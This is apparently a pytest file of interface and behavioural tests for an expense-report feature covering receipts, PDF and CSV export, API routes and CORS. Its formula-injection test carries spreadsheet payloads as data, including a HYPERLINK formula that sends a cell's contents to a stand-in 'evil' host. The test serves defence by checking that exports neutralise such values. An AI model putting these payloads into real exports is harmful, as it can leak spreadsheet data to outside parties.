"""Pre-development interface + behavioral tests for the Expense Report feature.

Covers P0-1 through P0-5, P1-1, P2-1, and P2-2 from the analysis brief.

Layout (matches repo pre-tester conventions):
  * Interface tests  — import, signature/type-hint, class-existence checks.
    These MUST pass immediately (stubs exist with correct signatures).
  * Behavioral tests — real acceptance-criteria assertions that will fail
    with NotImplementedError until the feature is implemented.

Run with:
    pytest tests/test_reports.py -v
"""
from __future__ import annotations

import inspect
from typing import get_type_hints

import pytest
from starlette.testclient import TestClient

from app import api, ocr
from app.reports import ReceiptStore, receipt_store
from app.report_generator import generate_csv, generate_pdf

# ============================================================================
# Fixtures / helpers
# ============================================================================


@pytest.fixture
def sample_receipt() -> ocr.ConfidenceReceipt:
    """A minimal ConfidenceReceipt with one line item."""
    return ocr.ConfidenceReceipt(
        merchant="Test Store",
        date="2026-07-01",
        items=[ocr.ReceiptItem(name="Widget", price=9.99)],
        total=9.99,
        tax=0.80,
        currency="USD",
        raw_text="Test Store\nWidget 9.99\nTotal 9.99",
        confidence={"merchant": 1.0, "date": 1.0, "total": 1.0},
    )


@pytest.fixture
def multi_item_receipt() -> ocr.ConfidenceReceipt:
    """A receipt with three line items for multi-row CSV tests."""
    return ocr.ConfidenceReceipt(
        merchant="Groceries",
        date="2026-07-02",
        items=[
            ocr.ReceiptItem(name="Milk", price=1.20),
            ocr.ReceiptItem(name="Bread", price=2.50),
            ocr.ReceiptItem(name="Eggs", price=3.00),
        ],
        total=6.70,
        tax=0.50,
        currency="EUR",
        raw_text="Groceries\nMilk 1.20\nBread 2.50\nEggs 3.00\nTotal 6.70",
        confidence={"merchant": 1.0, "date": 1.0, "total": 1.0},
    )


def _route_paths() -> set[str]:
    """Return the set of registered route paths from the FastAPI app."""
    return {getattr(r, "path", None) for r in api.app.routes}


# ============================================================================
# INTERFACE TESTS — must pass immediately
# ============================================================================


class TestReceiptStoreInterface:
    """P0-1: ReceiptStore class import, existence, and signature checks."""

    def test_receipt_store_importable(self) -> None:
        assert ReceiptStore is not None

    def test_receipt_store_singleton_exists(self) -> None:
        assert receipt_store is not None
        assert isinstance(receipt_store, ReceiptStore)

    def test_receipt_store_has_store_method(self) -> None:
        assert hasattr(ReceiptStore, "store")
        assert callable(ReceiptStore.store)

    def test_receipt_store_has_get_method(self) -> None:
        assert hasattr(ReceiptStore, "get")
        assert callable(ReceiptStore.get)

    def test_receipt_store_has_list_method(self) -> None:
        assert hasattr(ReceiptStore, "list")
        assert callable(ReceiptStore.list)

    def test_receipt_store_store_signature(self) -> None:
        """store(self, receipt: ConfidenceReceipt) -> str"""
        sig = inspect.signature(ReceiptStore.store)
        params = list(sig.parameters)
        assert params == ["self", "receipt"], f"store params: {params}"
        hints = get_type_hints(ReceiptStore.store)
        assert hints.get("receipt") is ocr.ConfidenceReceipt, (
            f"receipt hint: {hints.get('receipt')}"
        )
        assert hints.get("return") is str, (
            f"store return hint: {hints.get('return')}"
        )

    def test_receipt_store_get_signature(self) -> None:
        """get(self, receipt_id: str) -> ConfidenceReceipt | None"""
        sig = inspect.signature(ReceiptStore.get)
        params = list(sig.parameters)
        assert params == ["self", "receipt_id"], f"get params: {params}"
        hints = get_type_hints(ReceiptStore.get)
        assert hints.get("receipt_id") is str, (
            f"receipt_id hint: {hints.get('receipt_id')}"
        )
        ret = hints.get("return")
        # Union[ConfidenceReceipt, None] or Optional[ConfidenceReceipt]
        assert ret is None or ocr.ConfidenceReceipt in getattr(
            ret, "__args__", ()
        ), f"get return hint: {ret}"

    def test_receipt_store_list_signature(self) -> None:
        """list(self, date_from: str, date_to: str, *, merchant: str | None = None) -> list[ConfidenceReceipt]"""
        sig = inspect.signature(ReceiptStore.list)
        params = list(sig.parameters)
        assert "date_from" in params, f"list missing date_from: {params}"
        assert "date_to" in params, f"list missing date_to: {params}"
        # merchant must be keyword-only
        if "merchant" in sig.parameters:
            p = sig.parameters["merchant"]
            assert p.kind == inspect.Parameter.KEYWORD_ONLY, (
                f"merchant should be keyword-only, got kind={p.kind}"
            )
        hints = get_type_hints(ReceiptStore.list)
        assert hints.get("date_from") is str, (
            f"date_from hint: {hints.get('date_from')}"
        )
        assert hints.get("date_to") is str, (
            f"date_to hint: {hints.get('date_to')}"
        )
        ret = hints.get("return")
        assert ret is not None, "list has no return hint"
        assert "list" in str(ret) or "List" in str(ret), (
            f"list return hint: {ret}"
        )


class TestGeneratePdfInterface:
    """P0-3: generate_pdf import and signature checks."""

    def test_generate_pdf_importable(self) -> None:
        assert generate_pdf is not None
        assert callable(generate_pdf)

    def test_generate_pdf_signature(self) -> None:
        """generate_pdf(receipts: list[ConfidenceReceipt], *, title: str = "Expense Report") -> bytes"""
        sig = inspect.signature(generate_pdf)
        params = list(sig.parameters)
        assert "receipts" in params, f"missing receipts: {params}"
        assert "title" in params, f"missing title: {params}"
        p_title = sig.parameters["title"]
        assert p_title.kind == inspect.Parameter.KEYWORD_ONLY, (
            f"title should be keyword-only, got kind={p_title.kind}"
        )
        assert p_title.default == "Expense Report", (
            f"title default: {p_title.default!r}"
        )
        hints = get_type_hints(generate_pdf)
        assert hints.get("return") is bytes, (
            f"return hint: {hints.get('return')}"
        )


class TestGenerateCsvInterface:
    """P0-4: generate_csv import and signature checks."""

    def test_generate_csv_importable(self) -> None:
        assert generate_csv is not None
        assert callable(generate_csv)

    def test_generate_csv_signature(self) -> None:
        """generate_csv(receipts: list[ConfidenceReceipt]) -> str"""
        sig = inspect.signature(generate_csv)
        params = list(sig.parameters)
        assert params == ["receipts"], f"generate_csv params: {params}"
        hints = get_type_hints(generate_csv)
        assert hints.get("return") is str, (
            f"return hint: {hints.get('return')}"
        )


class TestApiRoutesInterface:
    """P0-2 + P0-5: route registration and model existence."""

    def test_post_receipts_route_registered(self) -> None:
        paths = _route_paths()
        assert "/api/v1/receipts" in paths, (
            "POST /api/v1/receipts route not registered"
        )

    def test_get_receipts_route_registered(self) -> None:
        paths = _route_paths()
        assert "/api/v1/receipts" in paths, (
            "GET /api/v1/receipts route not registered"
        )

    def test_get_receipt_by_id_route_registered(self) -> None:
        paths = _route_paths()
        assert any("/api/v1/receipts/" in p for p in paths if p), (
            "GET /api/v1/receipts/{receipt_id} route not registered"
        )

    def test_post_reports_route_registered(self) -> None:
        paths = _route_paths()
        assert "/api/v1/reports" in paths, (
            "POST /api/v1/reports route not registered"
        )

    def test_receipt_create_request_has_pydantic_model(self) -> None:
        """ReceiptCreateRequest must exist (or a recognisable equivalent)."""
        models = _collect_pydantic_models()
        found = any(
            "ReceiptCreate" in name or "ReceiptRequest" in name
            for name in models
        )
        assert found, (
            "No ReceiptCreateRequest/ReceiptRequest model found in app.api. "
            f"Models seen: {models}"
        )

    def test_report_request_has_pydantic_model(self) -> None:
        """ReportRequest must exist as a Pydantic model."""
        models = _collect_pydantic_models()
        found = any("Report" in name for name in models)
        assert found, (
            "No ReportRequest model found in app.api. "
            f"Models seen: {models}"
        )


class TestCategoryInterface:
    """P1-1: category field on ReceiptItem."""

    def test_receipt_item_has_category_field(self) -> None:
        item = ocr.ReceiptItem(name="Test", price=1.0, category="Meals")
        assert hasattr(item, "category")
        assert item.category == "Meals"

    def test_receipt_item_category_defaults_none(self) -> None:
        item = ocr.ReceiptItem(name="Test", price=1.0)
        assert item.category is None


class TestCorsInterface:
    """P2-1: CORS middleware registration."""

    def test_cors_middleware_registered(self) -> None:
        """Check that CORSMiddleware is in app.user_middleware."""
        from fastapi.middleware.cors import CORSMiddleware as CORSMiddlewareCls

        middleware_types = {
            m.cls for m in api.app.user_middleware
        }
        assert CORSMiddlewareCls in middleware_types, (
            f"CORSMiddleware not in registered middleware. "
            f"Types seen: {middleware_types}"
        )


class TestDatePresetsInterface:
    """P2-2: range field on ReportRequest."""

    def test_report_request_has_range_field(self) -> None:
        """ReportRequest or equivalent should accept a 'range' field."""
        models = _collect_pydantic_models()
        # Try to find ReportRequest and check for a 'range' field
        report_model = None
        for name, model_cls in vars(api).items():
            if "Report" in name and isinstance(model_cls, type):
                import pydantic

                if issubclass(model_cls, pydantic.BaseModel):
                    report_model = model_cls
                    break
        if report_model is not None:
            fields = report_model.model_fields if hasattr(
                report_model, "model_fields"
            ) else {}
            assert "range" in fields or "date_range" in fields, (
                f"ReportRequest missing range/date_range field. "
                f"Fields: {list(fields.keys())}"
            )
        else:
            # Can't find the model — still a valid observation
            pytest.skip("ReportRequest model not yet registered in app.api")


# ============================================================================
# BEHAVIORAL TESTS — fail with NotImplementedError until implemented
# ============================================================================


class TestReceiptStoreBehavioral:
    """P0-1: ReceiptStore runtime behavior."""

    def test_store_returns_uuid(self) -> None:
        receipt_id = receipt_store.store(
            ocr.ConfidenceReceipt(
                merchant="Test", date="2026-07-01",
                items=[], total=0.0, tax=0.0,
                currency="USD", raw_text="",
            )
        )
        import uuid

        uuid.UUID(receipt_id)  # raises ValueError if not valid UUID

    def test_get_returns_none_for_unknown(self) -> None:
        result = receipt_store.get("00000000-0000-0000-0000-000000000000")
        assert result is None

    def test_get_returns_stored_receipt(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[], total=5.0, tax=0.0,
            currency="USD", raw_text="",
        )
        rid = receipt_store.store(receipt)
        retrieved = receipt_store.get(rid)
        assert retrieved is not None
        assert retrieved.merchant == "Store"

    def test_list_filters_by_date_range(self) -> None:
        results = receipt_store.list(
            date_from="2026-01-01", date_to="2026-12-31"
        )
        assert isinstance(results, list)

    def test_list_merchant_filter_case_insensitive(self) -> None:
        results = receipt_store.list(
            date_from="2026-01-01", date_to="2026-12-31",
            merchant="starbucks",
        )
        assert isinstance(results, list)

    def test_list_no_matches_returns_empty(self) -> None:
        results = receipt_store.list(
            date_from="2019-01-01", date_to="2019-01-02"
        )
        assert results == []

    def test_store_thread_safety(self) -> None:
        """Two concurrent store() calls should not corrupt state."""
        import concurrent.futures

        def _store_one(val: float) -> str:
            r = ocr.ConfidenceReceipt(
                merchant="Thread", date="2026-07-01",
                items=[ocr.ReceiptItem(name="X", price=val)],
                total=val, tax=0.0,
                currency="USD", raw_text="",
            )
            return receipt_store.store(r)

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
            f1 = pool.submit(_store_one, 1.0)
            f2 = pool.submit(_store_one, 2.0)
            rid1 = f1.result()
            rid2 = f2.result()
        assert rid1 != rid2, "concurrent stores returned same id"
        r1 = receipt_store.get(rid1)
        r2 = receipt_store.get(rid2)
        assert r1 is not None and r2 is not None
        assert r1.total == 1.0 and r2.total == 2.0


class TestGeneratePdfBehavioral:
    """P0-3: generate_pdf acceptance criteria."""

    def test_generate_pdf_empty_list(self) -> None:
        result = generate_pdf([])
        assert isinstance(result, bytes)
        assert result.startswith(b"%PDF-")

    def test_generate_pdf_with_receipts(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Test Store", date="2026-07-01",
            items=[ocr.ReceiptItem(name="Widget", price=9.99)],
            total=9.99, tax=0.80, currency="USD", raw_text="",
        )
        result = generate_pdf([receipt])
        assert isinstance(result, bytes)
        assert result.startswith(b"%PDF-")

    def test_generate_pdf_contains_title(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[ocr.ReceiptItem(name="Item", price=1.0)],
            total=1.0, tax=0.0, currency="USD", raw_text="",
        )
        result = generate_pdf([receipt], title="My Report")
        assert b"My Report" in result

    def test_generate_pdf_contains_total_row(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[ocr.ReceiptItem(name="Item", price=1.0)],
            total=1.0, tax=0.0, currency="USD", raw_text="",
        )
        result = generate_pdf([receipt])
        assert b"Total" in result

    def test_generate_pdf_empty_line_items_graceful(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[], total=0.0, tax=0.0,
            currency="USD", raw_text="",
        )
        result = generate_pdf([receipt])
        assert isinstance(result, bytes)


class TestGenerateCsvBehavioral:
    """P0-4: generate_csv acceptance criteria."""

    def test_generate_csv_empty_list(self) -> None:
        result = generate_csv([])
        assert isinstance(result, str)
        # Header + "No expense items" row
        assert "Date" in result or "No expense" in result

    def test_generate_csv_with_receipts(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Test Store", date="2026-07-01",
            items=[ocr.ReceiptItem(name="Widget", price=9.99)],
            total=9.99, tax=0.80, currency="USD", raw_text="",
        )
        result = generate_csv([receipt])
        assert isinstance(result, str)
        assert "Date" in result
        assert "Merchant" in result
        assert "Amount" in result

    def test_generate_csv_columns(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[ocr.ReceiptItem(name="Item", price=1.0)],
            total=1.0, tax=0.0, currency="USD", raw_text="",
        )
        result = generate_csv([receipt])
        assert "Date" in result
        assert "Merchant" in result
        assert "Item" in result
        assert "Amount" in result

    def test_generate_csv_formula_injection(self) -> None:
        """CSV formula injection characters are neutralised with a leading quote.

        Spreadsheets execute cells starting with ``=``, ``+``, ``-``, ``@`` as
        formulas.  The output must prefix such values with ``'`` so they are
        treated as literal text.
        """
        receipt = ocr.ConfidenceReceipt(
            merchant='=HYPERLINK("http://evil/?c="&A1,A1)',
            date="2026-07-01",
            items=[
                ocr.ReceiptItem(name="+SUM(1,1)", price=9.99),
                ocr.ReceiptItem(name="-DANGER()", price=5.00),
                ocr.ReceiptItem(name="@INDIRECT(""A1"")", price=3.00),
            ],
            total=17.99,
            tax=0.0,
            currency="USD",
            raw_text="",
        )
        result = generate_csv([receipt])
        # The neutralised merchant starts with "'="  (single-quote prefix)
        assert "'=HYPERLINK" in result, (
            f"Merchant with '=' not neutralised. Output:\n{result}"
        )
        # Item names starting with +, -, @ are also neutralised
        assert "'+SUM(1,1)" in result, (
            f"Item with '+' not neutralised. Output:\n{result}"
        )
        assert "'-DANGER()" in result, (
            f"Item with '-' not neutralised. Output:\n{result}"
        )
        assert "'@INDIRECT" in result, (
            f"Item with '@' not neutralised. Output:\n{result}"
        )

    def test_generate_csv_normal_values_not_affected(self) -> None:
        """Values that do not start with formula characters are unmodified."""
        receipt = ocr.ConfidenceReceipt(
            merchant="Safe Store",
            date="2026-07-01",
            items=[ocr.ReceiptItem(name="Widget", price=9.99)],
            total=9.99,
            tax=0.80,
            currency="USD",
            raw_text="",
        )
        result = generate_csv([receipt])
        assert "Safe Store" in result
        assert "Widget" in result
        # No stray leading single-quote
        assert "'Safe" not in result
        assert "'Widget" not in result
        receipt = ocr.ConfidenceReceipt(
            merchant="Groceries", date="2026-07-02",
            items=[
                ocr.ReceiptItem(name="Milk", price=1.20),
                ocr.ReceiptItem(name="Bread", price=2.50),
                ocr.ReceiptItem(name="Eggs", price=3.00),
            ],
            total=6.70, tax=0.50, currency="EUR", raw_text="",
        )
        result = generate_csv([receipt])
        rows = result.strip().splitlines()
        assert len(rows) >= 4, f"Expected 4+ rows (header + 3 items), got {len(rows)}"


class TestReportsApiBehavioral:
    """P0-5: POST /api/v1/reports acceptance criteria."""

    @pytest.fixture
    def client(self) -> TestClient:
        return TestClient(api.app)

    def test_post_reports_pdf_format(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-01-01",
                "date_to": "2026-12-31",
                "format": "pdf",
            },
        )
        assert resp.status_code == 200
        assert resp.headers["content-type"] == "application/pdf"

    def test_post_reports_csv_format(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-01-01",
                "date_to": "2026-12-31",
                "format": "csv",
            },
        )
        assert resp.status_code == 200
        assert resp.headers["content-type"] == "text/csv"

    def test_post_reports_content_disposition(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-01-01",
                "date_to": "2026-01-31",
                "format": "pdf",
            },
        )
        assert resp.status_code == 200
        cd = resp.headers.get("content-disposition", "")
        assert "attachment" in cd
        assert "filename=" in cd

    def test_post_reports_date_from_gt_date_to_returns_422(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-12-31",
                "date_to": "2026-01-01",
                "format": "pdf",
            },
        )
        assert resp.status_code == 422

    def test_post_reports_invalid_date_format_returns_422(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "not-a-date",
                "date_to": "2026-12-31",
                "format": "pdf",
            },
        )
        assert resp.status_code == 422

    def test_post_reports_unknown_format_returns_422(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-01-01",
                "date_to": "2026-12-31",
                "format": "xlsx",
            },
        )
        assert resp.status_code == 422

    def test_post_reports_no_matches_returns_404(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2019-01-01",
                "date_to": "2019-01-02",
                "format": "pdf",
            },
        )
        assert resp.status_code == 404
        body = resp.json()
        assert "No receipts found" in body.get("detail", "")


class TestCategorySubtotalsBehavioral:
    """P1-2 + P1-3: category subtotals in PDF and CSV.

    These use ``generate_pdf`` / ``generate_csv`` directly (not via HTTP)
    because the route /api/v1/reports is a P0-5 task, while category
    subtotals are P1. Calling the generator stubs directly verifies the
    interface contract without depending on the full endpoint wiring.
    """

    def test_generate_pdf_with_categories_includes_summary(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[
                ocr.ReceiptItem(name="Pizza", price=12.0, category="Meals"),
                ocr.ReceiptItem(name="Bus", price=3.0, category="Transport"),
            ],
            total=15.0, tax=0.0, currency="USD", raw_text="",
        )
        result = generate_pdf([receipt])
        assert b"Category Summary" in result or b"Subtotal" in result

    def test_generate_csv_with_categories_includes_column(self) -> None:
        receipt = ocr.ConfidenceReceipt(
            merchant="Store", date="2026-07-01",
            items=[
                ocr.ReceiptItem(name="Pizza", price=12.0, category="Meals"),
            ],
            total=12.0, tax=0.0, currency="USD", raw_text="",
        )
        result = generate_csv([receipt])
        assert "Category" in result


class TestCorsBehavioral:
    """P2-1: CORS headers on responses."""

    @pytest.fixture
    def client(self) -> TestClient:
        return TestClient(api.app)

    def test_cors_on_post_reports(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "date_from": "2026-01-01",
                "date_to": "2026-12-31",
                "format": "pdf",
            },
        )
        allow_origin = resp.headers.get("access-control-allow-origin")
        assert allow_origin is not None, "Missing Access-Control-Allow-Origin"

    def test_cors_options_request(self, client: TestClient) -> None:
        resp = client.options("/api/v1/reports")
        allow_origin = resp.headers.get("access-control-allow-origin")
        assert allow_origin is not None, "Missing Access-Control-Allow-Origin"


class TestDatePresetsBehavioral:
    """P2-2: date range presets."""

    @pytest.fixture
    def client(self) -> TestClient:
        return TestClient(api.app)

    def test_report_with_range_this_month(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={"range": "this_month", "format": "pdf"},
        )
        assert resp.status_code in (200, 404), (
            f"Unexpected status: {resp.status_code}"
        )

    def test_range_and_dates_mutually_exclusive(self, client: TestClient) -> None:
        resp = client.post(
            "/api/v1/reports",
            json={
                "range": "this_month",
                "date_from": "2026-01-01",
                "date_to": "2026-01-31",
                "format": "pdf",
            },
        )
        assert resp.status_code == 400


# ============================================================================
# Helper
# ============================================================================


def _collect_pydantic_models() -> set[str]:
    """Scrape app.api for Pydantic BaseModel subclass names."""
    import pydantic

    models: set[str] = set()
    for name, obj in vars(api).items():
        if isinstance(obj, type) and issubclass(obj, pydantic.BaseModel):
            models.add(name)
    return models
